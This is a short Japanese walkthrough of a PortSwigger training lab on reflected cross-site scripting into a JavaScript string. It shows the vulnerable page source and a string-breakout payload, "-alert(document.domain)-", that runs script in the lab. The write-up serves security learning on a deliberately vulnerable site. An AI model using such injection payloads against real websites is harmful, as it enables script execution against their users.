# XSS を山括弧付き HTML エンコードされた JavaScript 文字列に反映

以下のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

- 1. ハッキングラボにアクセスします
- 2. 任意の文字列で検索を行います
- 3. 検索結果のページソースを確認します

```html
<script>
  var searchTerms = "abc";
  document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');
</script>
<section class="blog-list no-results"></section>
```

- 4. 文字列リテラルを抜けるために以下のワードで検索します

```js
"-alert(document.domain)-";
```

アラートが表示され、スクリプトが実行出来ていることが確認できます
